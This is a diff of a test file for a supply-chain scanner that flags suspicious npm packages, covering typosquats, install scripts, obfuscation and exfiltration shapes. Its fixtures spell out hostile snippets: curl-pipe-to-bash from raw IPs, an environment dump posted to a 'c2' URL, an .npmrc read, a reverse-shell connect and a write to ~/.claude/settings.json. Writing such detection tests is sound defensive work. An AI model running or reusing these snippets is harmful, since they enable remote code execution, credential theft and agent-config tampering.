@@ -1,246 +1,211 @@
-import { describe, expect, it } from "bun:test";
-import { diffFileSets } from "../src/diff.js";
-import { analyze, runHeuristics, score } from "../src/heuristics/index.js";
-import { editDistance, findTyposquat } from "../src/heuristics/nameDistance.js";
-import { scanJsSource, scanShellScript } from "../src/heuristics/scriptScan.js";
-import {
-  agentConfigWriter,
-  cleanEstablishedPackage,
-  cleanNewPackage,
-  curlPipePayload,
-  type Fixture,
-  hijackedPackage,
-  typosquatWithPayload,
-} from "./fixtures.js";
+import { test, expect } from "bun:test";
+import { scanShell, scanJs, obfuscationScore, analyze, type AnalysisInput } from "../src/heuristics/index.ts";
 
-function evaluate(fx: Fixture) {
-  const diff = diffFileSets(fx.current, fx.previous, {
-    metaScripts: fx.meta.scripts,
-    prevMetaScripts: fx.meta.previousScripts,
-  });
-  return runHeuristics(fx.meta, diff);
+function base(overrides: Partial<AnalysisInput> = {}): AnalysisInput {
+  return {
+    name: "x",
+    version: "1.0.0",
+    isNewPackage: false,
+    meta: { maintainers: ["a"], existsOnRegistry: true },
+    addedScripts: {},
+    changedScripts: {},
+    scanFiles: [],
+    ...overrides,
+  };
 }
+const idsOf = (signals: ReturnType<typeof analyze>) => signals.map((s) => s.id);
 
-describe("editDistance", () => {
-  it("computes basic edits", () => {
-    expect(editDistance("is-odd", "is0dd")).toBeLessThanOrEqual(2);
-    expect(editDistance("react", "react")).toBe(0);
-    expect(editDistance("chalk", "chlak")).toBe(1);
-  });
+test("scanShell detects curl-pipe and raw IP", () => {
+  const f = scanShell("curl -s http://185.1.2.3/i.sh | bash");
+  expect(f.some((x) => x.kind === "network")).toBe(true);
+  expect(f.some((x) => x.kind === "shell_exec")).toBe(true);
+  expect(f.some((x) => x.kind === "raw_ip")).toBe(true);
 });
 
-describe("findTyposquat", () => {
-  it("flags near-misses of popular packages", () => {
-    const m = findTyposquat("is0dd");
-    expect(m?.target).toBe("is-odd");
-  });
-  it("does not flag the real package", () => {
-    expect(findTyposquat("react")).toBeNull();
-    expect(findTyposquat("lodash")).toBeNull();
-  });
-  it("ignores very short names", () => {
-    expect(findTyposquat("ab")).toBeNull();
-  });
+test("scanShell quiet on a normal build script", () => {
+  expect(scanShell("tsc && bun test")).toHaveLength(0);
 });
 
-describe("scanShellScript", () => {
-  it("detects curl-pipe-to-shell", () => {
-    const f = scanShellScript("curl -s http://x/i.sh | bash");
-    expect(f.some((x) => x.kind === "network")).toBe(true);
-    expect(f.some((x) => x.kind === "shell_exec")).toBe(true);
-  });
-  it("detects raw IPs", () => {
-    expect(scanShellScript("wget http://185.234.72.19/x").some((x) => x.kind === "raw_ip")).toBe(
-      true,
-    );
-  });
-  it("is quiet on a normal build script", () => {
-    expect(scanShellScript("tsc && vitest run")).toHaveLength(0);
-  });
+test("scanJs detects child_process, network, base64, env", () => {
+  const kinds = scanJs("const cp=require('child_process');const h=require('https');Buffer.from(x,'base64');process.env.TOKEN;").map((f) => f.kind);
+  expect(kinds).toContain("child_process");
+  expect(kinds).toContain("network");
+  expect(kinds).toContain("base64");
+  expect(kinds).toContain("env_exfil");
 });
 
-describe("scanJsSource", () => {
-  it("detects child_process, network, base64, env", () => {
-    const kinds = scanJsSource(
-      "const cp=require('child_process');const h=require('https');Buffer.from(x,'base64');process.env.TOKEN;",
-    ).map((f) => f.kind);
-    expect(kinds).toContain("child_process");
-    expect(kinds).toContain("network");
-    expect(kinds).toContain("base64");
-    expect(kinds).toContain("env_exfil");
-  });
-  it("is quiet on plain library code", () => {
-    expect(scanJsSource("export const add = (a,b) => a + b;")).toHaveLength(0);
-  });
+test("scanJs quiet on plain library code", () => {
+  expect(scanJs("export const add=(a,b)=>a+b;")).toHaveLength(0);
 });
 
-describe("verdict scoring", () => {
-  it("flags a typosquat with an exfiltrating postinstall as HIGH", () => {
-    const r = evaluate(typosquatWithPayload);
-    expect(r.level).toBe("HIGH");
-    expect(r.flags).toContain("typosquat");
-    expect(r.flags).toContain("new_postinstall");
-    expect(r.flags).toContain("network_in_script");
-    expect(r.score).toBeGreaterThanOrEqual(6.5);
-  });
-
-  it("flags a curl-pipe-to-shell postinstall as HIGH", () => {
-    const r = evaluate(curlPipePayload);
-    expect(r.level).toBe("HIGH");
-    expect(r.flags).toContain("new_postinstall");
-    expect(r.flags).toContain("network_in_script");
-  });
-
-  it("flags a hijacked package (maintainer swap + new obfuscated postinstall) as HIGH", () => {
-    const r = evaluate(hijackedPackage);
-    expect(r.level).toBe("HIGH");
-    expect(r.flags).toContain("maintainer_changed");
-    expect(r.flags).toContain("new_postinstall");
-  });
-
-  it("flags a package that writes to agent config paths", () => {
-    const r = evaluate(agentConfigWriter);
-    expect(r.flags).toContain("writes_agent_config");
-    expect(r.level).toBe("HIGH");
-  });
-
-  it("does NOT flag a clean brand-new package (newness alone is not risk)", () => {
-    const r = evaluate(cleanNewPackage);
-    expect(r.level).toBe("LOW");
-    expect(r.flags).not.toContain("recent_publish");
-    expect(r.flags).not.toContain("low_install_history");
-  });
-
-  it("does NOT flag a clean established package with a legit build script", () => {
-    const r = evaluate(cleanEstablishedPackage);
-    expect(r.level).toBe("LOW");
-  });
+test("install script added is flagged as an action signal", () => {
+  const s = analyze(base({ addedScripts: { postinstall: "node ./setup.js" } }));
+  expect(s.some((x) => x.id === "install-script-added" && x.action)).toBe(true);
 });
 
-describe("analyze — signal coverage", () => {
-  const emptyDiff = () => diffFileSets([], undefined, {});
-
-  it("flags a changed lifecycle script on an existing package", () => {
-    const diff = diffFileSets([], [], {
-      metaScripts: { preinstall: "node collect.js" },
-      prevMetaScripts: { preinstall: "node ok.js" },
-      isNewPackage: false,
-    });
-    const signals = analyze(cleanEstablishedPackage.meta, diff);
-    expect(
-      signals.some((s) => s.flag === "new_install_script" && s.evidence.includes("changed")),
-    ).toBe(true);
-  });
-
-  it("scans non-lifecycle script bodies too", () => {
-    const diff = diffFileSets([], [], {
-      metaScripts: { build: "curl http://e/i.sh | bash" },
-      isNewPackage: false,
-    });
-    const signals = analyze(cleanEstablishedPackage.meta, diff);
-    expect(signals.some((s) => s.flag === "network_in_script")).toBe(true);
-  });
-
-  it("suppresses an env read without any network capability", () => {
-    const files = [{ path: "a.js", size: 10, content: "const t = process.env.T;", binary: false }];
-    const diff = diffFileSets(files, undefined, {});
-    const signals = analyze(cleanNewPackage.meta, diff);
-    expect(signals.some((s) => s.evidence.includes("process.env"))).toBe(false);
-  });
-
-  it("boosts env read + network into an exfiltration-shape signal", () => {
-    const files = [
-      { path: "a.js", size: 40, content: "fetch('https://e'); process.env.TOKEN;", binary: false },
-    ];
-    const diff = diffFileSets(files, undefined, {});
-    const signals = analyze(cleanNewPackage.meta, diff);
-    expect(signals.some((s) => s.evidence.includes("exfiltration shape"))).toBe(true);
-  });
-
-  it("flags agent-config paths referenced from script bodies", () => {
-    const diff = diffFileSets([], undefined, {
-      metaScripts: { postinstall: "cp evil.json ~/.claude/settings.json" },
-    });
-    const signals = analyze(cleanNewPackage.meta, diff);
-    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(true);
-  });
-
-  it("flags a deprecated package", () => {
-    const meta = { ...cleanEstablishedPackage.meta, deprecated: "no longer maintained" };
-    const signals = analyze(meta, emptyDiff());
-    expect(signals.some((s) => s.flag === "deprecated")).toBe(true);
-  });
-
-  it("weights typosquats of mid-popularity packages lower", () => {
-    const meta = { ...cleanNewPackage.meta, name: "is0dd" };
-    const signals = analyze(meta, emptyDiff());
-    const squat = signals.find((s) => s.flag === "typosquat");
-    expect(squat?.weight).toBe(4);
-  });
+test("typosquat of a very popular package flags high", () => {
+  const s = analyze(base({ name: "lodahs", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 47, ageDays: 0.5 } }));
+  expect(idsOf(s)).toContain("typosquat");
+  // newness signals present too (they will count because an action signal exists)
+  expect(idsOf(s)).toContain("low-install-history");
 });
 
-describe("score — gating and damping", () => {
-  it("drops newness signals without an action signal", () => {
-    const r = score(cleanNewPackage.meta, [
-      { flag: "recent_publish", evidence: "new", weight: 1.5, requiresActionSignal: true },
-      { flag: "deprecated", evidence: "old", weight: 1 },
-    ]);
-    expect(r.flags).toEqual(["deprecated"]);
-    expect(r.score).toBe(1);
-  });
-
-  it("keeps newness signals when an action signal exists", () => {
-    const r = score(cleanNewPackage.meta, [
-      { flag: "recent_publish", evidence: "new", weight: 1.5, requiresActionSignal: true },
-      { flag: "new_postinstall", evidence: "postinstall", weight: 2.5, isActionSignal: true },
-    ]);
-    expect(r.flags).toContain("recent_publish");
-    expect(r.level).toBe("MEDIUM");
-  });
-
-  it("damps residual noise for trusted maintainers without action signals", () => {
-    const r = score(cleanEstablishedPackage.meta, [
-      { flag: "deprecated", evidence: "old", weight: 2 },
-    ]);
-    expect(r.score).toBeLessThan(1);
-    expect(r.level).toBe("LOW");
-  });
-
-  it("does not damp action signals for trusted maintainers", () => {
-    const r = score(cleanEstablishedPackage.meta, [
-      { flag: "new_postinstall", evidence: "postinstall", weight: 7, isActionSignal: true },
-    ]);
-    expect(r.score).toBe(7);
-    expect(r.level).toBe("HIGH");
-  });
-
-  it("clamps the score to 10", () => {
-    const r = score(cleanNewPackage.meta, [
-      { flag: "typosquat", evidence: "squat", weight: 9, isActionSignal: true },
-      { flag: "new_postinstall", evidence: "postinstall", weight: 9, isActionSignal: true },
-    ]);
-    expect(r.score).toBe(10);
-    expect(r.level).toBe("HIGH");
-  });
+test("delimiter variant (low-download squat) is only a low-weight signal", () => {
+  // A squat impersonating classnames would have low downloads; that is when the
+  // delimiter-variant signal applies. (An ESTABLISHED class-names is exempt — see below.)
+  const s = analyze(base({ name: "class-names", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 30 } }));
+  const t = s.find((x) => x.category === "typosquat");
+  expect(t?.id).toBe("delimiter-variant");
+  expect(t!.weight).toBeLessThan(40);
 });
 
-describe("analyze — agent-config and typosquat edges", () => {
-  it("flags AGENTS.md shipped in the tarball", () => {
-    const files = [{ path: "AGENTS.md", size: 5, content: "hi", binary: false }];
-    const diff = diffFileSets(files, undefined, {});
-    const signals = analyze(cleanNewPackage.meta, diff);
-    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(true);
-  });
+test("an established package is never flagged as a typosquat (got FP fix)", () => {
+  const s = analyze(base({ name: "got", meta: { maintainers: ["sindresorhus"], existsOnRegistry: true, weeklyDownloads: 10_000_000 } }));
+  expect(s.find((x) => x.category === "typosquat")).toBeUndefined();
+});
 
-  it("does not flag agent-config paths on established diffs without changes", () => {
-    const diff = diffFileSets([], [], {});
-    const signals = analyze(cleanEstablishedPackage.meta, diff);
-    expect(signals.some((s) => s.flag === "writes_agent_config")).toBe(false);
-  });
+test("nonexistent name is a slopsquat block-weight signal", () => {
+  const s = analyze(base({ name: "react-codeshift", meta: { maintainers: [], existsOnRegistry: false } }));
+  const slop = s.find((x) => x.category === "slopsquat");
+  expect(slop?.weight).toBeGreaterThanOrEqual(80);
+});
 
-  it("ignores the scope when checking typosquats", () => {
-    const meta = { ...cleanNewPackage.meta, name: "@acme/lodahs" };
-    const signals = analyze(meta, diffFileSets([], undefined, {}));
-    expect(signals.some((s) => s.flag === "typosquat")).toBe(true);
-  });
+test("provenance downgrade + maintainer change flag", () => {
+  const s = analyze(
+    base({
+      name: "axios-style",
+      meta: {
+        maintainers: ["attacker"],
+        previousMaintainers: ["original"],
+        previousHadProvenance: true,
+        hasProvenance: false,
+        existsOnRegistry: true,
+      },
+    }),
+  );
+  expect(idsOf(s)).toContain("provenance-downgrade");
+  expect(idsOf(s)).toContain("maintainer-changed");
+});
+
+test("bare network + env (no raw IP) is NOT an action signal", () => {
+  // The express/request false-positive fix: using http/https and reading env is
+  // ubiquitous in legit code and must not by itself create a blocking signal.
+  const s = analyze(
+    base({
+      name: "some-http-lib",
+      meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 100 },
+      scanFiles: [{ path: "index.js", text: "const https=require('https');const p=process.env.PORT;https.get('https://api.example.com');" }],
+    }),
+  );
+  expect(s.filter((x) => x.action)).toHaveLength(0);
+});
+
+test("env dump + raw IP together IS an exfiltration signal", () => {
+  const s = analyze(
+    base({
+      scanFiles: [{ path: "x.js", text: "const t=JSON.stringify(process.env);require('https').request('http://185.62.1.9/c2');" }],
+    }),
+  );
+  expect(idsOf(s)).toContain("exfil-shape");
+});
+
+test("plain minification is NOT flagged as obfuscation (I4 fix)", () => {
+  // Realistic long minified line: varied tokens/punctuation, mangled short
+  // names, no _0x / long-base64-blob / hex-escape.
+  const minified = "function f(a,b){return a+b}var c=[1,2,3,4,5],d={x:1,y:2};".repeat(150);
+  const s = analyze(base({ name: "some-bundle", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 20 }, scanFiles: [{ path: "dist/b.js", text: minified }] }));
+  expect(s.find((x) => x.id === "obfuscated")).toBeUndefined();
+});
+
+test("hex-identifier obfuscation IS flagged (I4 keeps true positives)", () => {
+  const obf = "var _0x1a2b=['a','b'];function _0x3c(){}" + ";var q='" + "Q".repeat(900) + "';";
+  const s = analyze(base({ name: "sketchy", meta: { maintainers: ["a"], existsOnRegistry: true, weeklyDownloads: 20 }, scanFiles: [{ path: "index.js", text: obf }] }));
+  expect(s.find((x) => x.id === "obfuscated")).toBeDefined();
+});
+
+test("clean package yields no action signals", () => {
+  const s = analyze(base({ name: "tiny-slugify", meta: { maintainers: ["dev"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 400 }, scanFiles: [{ path: "index.js", text: "export const x=1;" }] }));
+  expect(s.filter((x) => x.action)).toHaveLength(0);
+});
+
+test("established scoped packages are never scoped-impersonation (@types FP fix)", () => {
+  for (const name of ["@types/react", "@types/lodash", "@testing-library/react"]) {
+    const s = analyze(base({ name, meta: { maintainers: ["types"], existsOnRegistry: true, weeklyDownloads: 20_000_000 } }));
+    expect(s.find((x) => x.id === "scoped-impersonation")).toBeUndefined();
+  }
+});
+
+test("established flag alone (downloads unknown) also suppresses scoped-impersonation", () => {
+  const s = analyze(base({ name: "@types/react", meta: { maintainers: ["types"], existsOnRegistry: true, established: true } }));
+  expect(s.find((x) => x.id === "scoped-impersonation")).toBeUndefined();
+});
+
+test("obscure scope wrapping a mega-popular name is still scoped-impersonation", () => {
+  const s = analyze(base({ name: "@typescript_eslinter/eslint", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 12 } }));
+  expect(idsOf(s)).toContain("scoped-impersonation");
+});
+
+test("lifecycle script body with curl|bash yields script-* action signals", () => {
+  const s = analyze(base({ addedScripts: { postinstall: "curl http://185.1.2.3/x.sh | bash" } }));
+  expect(idsOf(s)).toContain("script-network");
+  expect(idsOf(s)).toContain("script-shell_exec");
+  expect(idsOf(s)).toContain("script-raw_ip");
+});
+
+test("each exfiltration/destructive code finding maps to its own signal", () => {
+  const s = analyze(
+    base({
+      scanFiles: [
+        { path: "imds.js", text: "fetch('http://169.254.169.254/latest/meta-data/');" },
+        { path: "dns.js", text: "const dns=require('dns');dns.lookup('x.example');" },
+        { path: "creds.js", text: "const fs=require('fs');fs.readFileSync(home + '/.npmrc');" },
+        { path: "wipe.js", text: "const fs=require('fs');fs.rmSync(dir,{recursive:true});" },
+        { path: "shell.js", text: "const net=require('net');const s=net.connect(1337,'h');const p=spawn('sh');s.pipe(p.stdin);" },
+      ],
+    }),
+  );
+  for (const id of ["code-metadata_host", "code-dns_egress", "code-fs_sensitive", "code-destructive_fs", "code-reverse_shell"]) {
+    expect(idsOf(s)).toContain(id);
+  }
+});
+
+test("scanJs detects new Function and ESM imports of exec/network modules", () => {
+  const kinds = scanJs("import cp from 'child_process';import net from 'node:net';const f=new Function('return 1');").map((f) => f.kind);
+  expect(kinds).toContain("eval");
+  expect(kinds).toContain("child_process");
+  expect(kinds).toContain("network");
+});
+
+test("long hex-escape runs are a hard obfuscation signature", () => {
+  const r = obfuscationScore("var s='" + "\\x41".repeat(30) + "';");
+  expect(r.hard).toBe(true);
+  expect(r.reason).toContain("hex-escape");
+});
+
+test("scanJs catches indirect eval", () => {
+  expect(scanJs("(0,eval)('x')").map((f) => f.kind)).toContain("eval");
+});
+
+test("obscure scope wrapping a non-popular name falls through without a scoped signal", () => {
+  const s = analyze(base({ name: "@somescope/utterly-unknown-pkg", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 12 } }));
+  expect(s.find((x) => x.category === "typosquat")).toBeUndefined();
+});
+
+test("a raw URL/git dependency in package.json is flagged", () => {
+  const pkg = JSON.stringify({ dependencies: { evil: "git+https://github.com/x/evil.git", ok: "^1.0.0" } });
+  const s = analyze(base({ scanFiles: [{ path: "package.json", text: pkg }] }));
+  const d = s.find((x) => x.id === "direct-url-dependency");
+  expect(d?.evidence.detail).toContain("evil@git+https");
+});
+
+test("malformed package.json yields no manifest signal", () => {
+  const s = analyze(base({ scanFiles: [{ path: "package.json", text: "{not json" }] }));
+  expect(idsOf(s)).not.toContain("direct-url-dependency");
+});
+
+test("homoglyph squat of a top package is the strong homoglyph signal", () => {
+  const s = analyze(base({ name: "l0dash", meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 5 } }));
+  const t = s.find((x) => x.category === "typosquat");
+  expect(t?.id).toBe("homoglyph-typosquat");
+  expect(t!.weight).toBeGreaterThanOrEqual(60);
 });
